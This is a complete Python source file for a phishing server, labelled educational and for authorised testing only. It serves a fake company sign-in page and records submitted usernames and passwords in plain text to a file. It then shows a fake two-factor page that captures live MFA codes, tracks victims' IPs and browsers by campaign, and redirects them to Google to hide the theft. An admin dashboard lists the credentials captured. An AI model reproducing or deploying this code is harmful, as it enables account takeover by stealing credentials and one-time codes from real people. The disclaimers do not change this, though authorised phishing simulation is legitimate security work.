"""
Advanced Phishing Framework - Server
⚠️ FOR EDUCATIONAL PURPOSES ONLY

This is an educational demonstration of phishing techniques.
NEVER use this on real targets without explicit authorization.
"""

import asyncio
import json
import logging
from datetime import datetime
from pathlib import Path
from typing import Dict, List
import secrets

from aiohttp import web
import aiofiles


logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class PhishingCampaign:
    """Represents a phishing campaign"""

    def __init__(self, campaign_id: str, target: str, template: str):
        self.campaign_id = campaign_id
        self.target = target
        self.template = template
        self.created_at = datetime.now()
        self.victims: List[Dict] = []
        self.credentials: List[Dict] = []
        self.clicks = 0

    def add_click(self, ip: str, user_agent: str):
        """Record a link click"""
        self.clicks += 1
        self.victims.append({
            'timestamp': datetime.now().isoformat(),
            'ip': ip,
            'user_agent': user_agent,
            'action': 'click'
        })

    def add_credential(self, data: dict, ip: str):
        """Record captured credentials"""
        self.credentials.append({
            'timestamp': datetime.now().isoformat(),
            'ip': ip,
            'data': data
        })


class PhishingServer:
    """Advanced phishing server with MFA capture"""

    def __init__(self, host: str = "0.0.0.0", port: int = 8080):
        self.host = host
        self.port = port
        self.app = web.Application()
        self.campaigns: Dict[str, PhishingCampaign] = {}
        self.data_dir = Path(__file__).parent.parent / "data"
        self.templates_dir = Path(__file__).parent.parent / "templates"
        self.static_dir = Path(__file__).parent.parent / "static"

        # Create data directory
        self.data_dir.mkdir(exist_ok=True)

        self._setup_routes()

        logger.warning("=" * 60)
        logger.warning("⚠️  ADVANCED PHISHING FRAMEWORK")
        logger.warning("⚠️  FOR EDUCATIONAL PURPOSES ONLY")
        logger.warning("⚠️  AUTHORIZED TESTING ONLY")
        logger.warning("=" * 60)

    def _setup_routes(self):
        """Setup HTTP routes"""
        # Phishing pages
        self.app.router.add_get('/login', self.handle_login_page)
        self.app.router.add_post('/auth', self.handle_auth)
        self.app.router.add_post('/mfa', self.handle_mfa)

        # Campaign management
        self.app.router.add_get('/admin', self.handle_admin)
        self.app.router.add_get('/admin/campaigns', self.handle_campaigns_list)
        self.app.router.add_get('/admin/campaign/{campaign_id}', self.handle_campaign_detail)

        # Link tracking
        self.app.router.add_get('/track/{campaign_id}', self.handle_track)

        # Static files
        self.app.router.add_static('/static', self.static_dir)

    async def handle_login_page(self, request):
        """Serve fake login page"""
        campaign_id = request.query.get('c', 'default')
        ip = request.remote
        user_agent = request.headers.get('User-Agent', 'Unknown')

        # Track the visit
        if campaign_id in self.campaigns:
            self.campaigns[campaign_id].add_click(ip, user_agent)

        logger.info(f"📧 Login page accessed from {ip}")
        logger.info(f"   User-Agent: {user_agent}")

        # Serve phishing page
        template_path = self.templates_dir / "login.html"
        if template_path.exists():
            async with aiofiles.open(template_path, 'r') as f:
                content = await f.read()
                # Inject campaign ID
                content = content.replace('{{campaign_id}}', campaign_id)
                return web.Response(text=content, content_type='text/html')
        else:
            return web.Response(text=self._default_login_page(campaign_id), content_type='text/html')

    async def handle_auth(self, request):
        """Handle authentication submission"""
        data = await request.post()
        campaign_id = data.get('campaign_id', 'default')
        username = data.get('username', '')
        password = data.get('password', '')
        ip = request.remote

        logger.info(f"🎣 Credentials captured from {ip}")
        logger.info(f"   Username: {username}")
        logger.info(f"   Password: {'*' * len(password)}")

        # Store credentials
        if campaign_id in self.campaigns:
            self.campaigns[campaign_id].add_credential({
                'username': username,
                'password': password,
                'stage': 'initial_auth'
            }, ip)

        # Save to file
        await self._save_credentials({
            'timestamp': datetime.now().isoformat(),
            'ip': ip,
            'username': username,
            'password': password,
            'campaign_id': campaign_id
        })

        # Return MFA page
        template_path = self.templates_dir / "mfa.html"
        if template_path.exists():
            async with aiofiles.open(template_path, 'r') as f:
                content = await f.read()
                content = content.replace('{{campaign_id}}', campaign_id)
                content = content.replace('{{username}}', username)
                return web.Response(text=content, content_type='text/html')
        else:
            return web.Response(text=self._default_mfa_page(campaign_id, username), content_type='text/html')

    async def handle_mfa(self, request):
        """Handle MFA code submission"""
        data = await request.post()
        campaign_id = data.get('campaign_id', 'default')
        username = data.get('username', '')
        mfa_code = data.get('mfa_code', '')
        ip = request.remote

        logger.info(f"🔐 MFA code captured from {ip}")
        logger.info(f"   Username: {username}")
        logger.info(f"   MFA Code: {mfa_code}")

        # Store MFA code
        if campaign_id in self.campaigns:
            self.campaigns[campaign_id].add_credential({
                'username': username,
                'mfa_code': mfa_code,
                'stage': 'mfa'
            }, ip)

        # Save to file
        await self._save_credentials({
            'timestamp': datetime.now().isoformat(),
            'ip': ip,
            'username': username,
            'mfa_code': mfa_code,
            'campaign_id': campaign_id
        })

        # Redirect to legitimate site or show success
        return web.Response(
            text="""
            <html>
            <head><title>Authentication Successful</title></head>
            <body>
                <h1>Authentication Successful</h1>
                <p>Please wait while we redirect you...</p>
                <script>
                    setTimeout(function() {
                        window.location.href = 'https://www.google.com';
                    }, 2000);
                </script>
            </body>
            </html>
            """,
            content_type='text/html'
        )

    async def handle_track(self, request):
        """Handle link tracking"""
        campaign_id = request.match_info['campaign_id']
        ip = request.remote
        user_agent = request.headers.get('User-Agent', 'Unknown')

        if campaign_id in self.campaigns:
            self.campaigns[campaign_id].add_click(ip, user_agent)

        logger.info(f"🔗 Link clicked from {ip} - Campaign: {campaign_id}")

        # Redirect to login page
        return web.HTTPFound(f'/login?c={campaign_id}')

    async def handle_admin(self, request):
        """Admin dashboard"""
        html = """
        <html>
        <head>
            <title>Phishing Framework - Admin</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
                .container { max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; }
                h1 { color: #333; border-bottom: 2px solid #e74c3c; padding-bottom: 10px; }
                .warning { background: #fff3cd; border: 1px solid #ffc107; padding: 15px; margin: 20px 0; border-radius: 4px; }
                .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin: 30px 0; }
                .stat-card { background: #ecf0f1; padding: 20px; border-radius: 4px; text-align: center; }
                .stat-number { font-size: 36px; font-weight: bold; color: #3498db; }
                .stat-label { color: #7f8c8d; margin-top: 10px; }
                table { width: 100%; border-collapse: collapse; margin: 20px 0; }
                th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
                th { background: #34495e; color: white; }
                tr:hover { background: #f5f5f5; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>⚠️ Phishing Framework - Admin Dashboard</h1>

                <div class="warning">
                    <strong>⚠️ WARNING:</strong> This is an educational tool for authorized testing only.
                    Unauthorized use is illegal.
                </div>

                <div class="stats">
                    <div class="stat-card">
                        <div class="stat-number">{campaigns}</div>
                        <div class="stat-label">Active Campaigns</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">{clicks}</div>
                        <div class="stat-label">Total Clicks</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">{credentials}</div>
                        <div class="stat-label">Credentials Captured</div>
                    </div>
                </div>

                <h2>Campaigns</h2>
                <table>
                    <tr>
                        <th>Campaign ID</th>
                        <th>Target</th>
                        <th>Clicks</th>
                        <th>Credentials</th>
                        <th>Created</th>
                    </tr>
                    {campaign_rows}
                </table>

                <h2>Quick Links</h2>
                <ul>
                    <li><a href="/login?c=test">Test Login Page</a></li>
                    <li><a href="/admin/campaigns">View All Campaigns</a></li>
                </ul>
            </div>
        </body>
        </html>
        """

        # Calculate stats
        total_clicks = sum(c.clicks for c in self.campaigns.values())
        total_creds = sum(len(c.credentials) for c in self.campaigns.values())

        # Generate campaign rows
        campaign_rows = ""
        for campaign_id, campaign in self.campaigns.items():
            campaign_rows += f"""
            <tr>
                <td><a href="/admin/campaign/{campaign_id}">{campaign_id}</a></td>
                <td>{campaign.target}</td>
                <td>{campaign.clicks}</td>
                <td>{len(campaign.credentials)}</td>
                <td>{campaign.created_at.strftime('%Y-%m-%d %H:%M')}</td>
            </tr>
            """

        if not campaign_rows:
            campaign_rows = "<tr><td colspan='5'>No campaigns yet</td></tr>"

        html = html.format(
            campaigns=len(self.campaigns),
            clicks=total_clicks,
            credentials=total_creds,
            campaign_rows=campaign_rows
        )

        return web.Response(text=html, content_type='text/html')

    async def handle_campaigns_list(self, request):
        """List all campaigns as JSON"""
        campaigns_data = {}
        for campaign_id, campaign in self.campaigns.items():
            campaigns_data[campaign_id] = {
                'target': campaign.target,
                'clicks': campaign.clicks,
                'credentials': len(campaign.credentials),
                'created_at': campaign.created_at.isoformat()
            }

        return web.json_response(campaigns_data)

    async def handle_campaign_detail(self, request):
        """Get campaign details"""
        campaign_id = request.match_info['campaign_id']

        if campaign_id not in self.campaigns:
            return web.json_response({'error': 'Campaign not found'}, status=404)

        campaign = self.campaigns[campaign_id]
        return web.json_response({
            'campaign_id': campaign_id,
            'target': campaign.target,
            'clicks': campaign.clicks,
            'victims': campaign.victims,
            'credentials': campaign.credentials,
            'created_at': campaign.created_at.isoformat()
        })

    async def _save_credentials(self, data: dict):
        """Save credentials to file"""
        creds_file = self.data_dir / "credentials.jsonl"
        async with aiofiles.open(creds_file, 'a') as f:
            await f.write(json.dumps(data) + '\n')

    def create_campaign(self, campaign_id: str, target: str, template: str = "default"):
        """Create new campaign"""
        campaign = PhishingCampaign(campaign_id, target, template)
        self.campaigns[campaign_id] = campaign
        logger.info(f"📋 Campaign created: {campaign_id} - Target: {target}")
        return campaign

    def _default_login_page(self, campaign_id: str) -> str:
        """Default login page template"""
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Sign In</title>
            <style>
                body {{ font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
                .login-box {{ background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 400px; }}
                .logo {{ text-align: center; margin-bottom: 30px; font-size: 32px; color: #1877f2; font-weight: bold; }}
                input {{ width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}
                button {{ width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }}
                button:hover {{ background: #166fe5; }}
                .warning {{ font-size: 10px; color: #999; text-align: center; margin-top: 20px; }}
            </style>
        </head>
        <body>
            <div class="login-box">
                <div class="logo">Company Login</div>
                <form action="/auth" method="post">
                    <input type="hidden" name="campaign_id" value="{campaign_id}">
                    <input type="email" name="username" placeholder="Email or username" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Sign In</button>
                </form>
                <div class="warning">⚠️ Educational Demo - For Testing Only</div>
            </div>
        </body>
        </html>
        """

    def _default_mfa_page(self, campaign_id: str, username: str) -> str:
        """Default MFA page template"""
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Two-Factor Authentication</title>
            <style>
                body {{ font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
                .mfa-box {{ background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 400px; }}
                .title {{ text-align: center; margin-bottom: 20px; font-size: 24px; color: #333; }}
                .subtitle {{ text-align: center; color: #666; margin-bottom: 30px; }}
                input {{ width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; text-align: center; font-size: 18px; letter-spacing: 4px; }}
                button {{ width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }}
                button:hover {{ background: #166fe5; }}
                .warning {{ font-size: 10px; color: #999; text-align: center; margin-top: 20px; }}
            </style>
        </head>
        <body>
            <div class="mfa-box">
                <div class="title">🔐 Two-Factor Authentication</div>
                <div class="subtitle">Enter the 6-digit code from your authenticator app</div>
                <form action="/mfa" method="post">
                    <input type="hidden" name="campaign_id" value="{campaign_id}">
                    <input type="hidden" name="username" value="{username}">
                    <input type="text" name="mfa_code" placeholder="000000" maxlength="6" pattern="[0-9]{{6}}" required autofocus>
                    <button type="submit">Verify</button>
                </form>
                <div class="warning">⚠️ Educational Demo - For Testing Only</div>
            </div>
        </body>
        </html>
        """

    async def start(self):
        """Start phishing server"""
        runner = web.AppRunner(self.app)
        await runner.setup()
        site = web.TCPSite(runner, self.host, self.port)
        await site.start()

        logger.info(f"🚀 Phishing server started on http://{self.host}:{self.port}")
        logger.info(f"📊 Admin dashboard: http://127.0.0.1:{self.port}/admin")
        logger.info(f"🎣 Phishing page: http://127.0.0.1:{self.port}/login")

        # Create default test campaign
        self.create_campaign("test", "test-target@example.com")

        # Keep running
        await asyncio.Event().wait()


async def main():
    """Main function"""
    import argparse

    parser = argparse.ArgumentParser(description="Advanced Phishing Framework")
    parser.add_argument("--host", default="0.0.0.0", help="Listen host")
    parser.add_argument("--port", type=int, default=8080, help="Listen port")

    args = parser.parse_args()

    server = PhishingServer(args.host, args.port)
    await server.start()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("\n🛑 Server stopped")
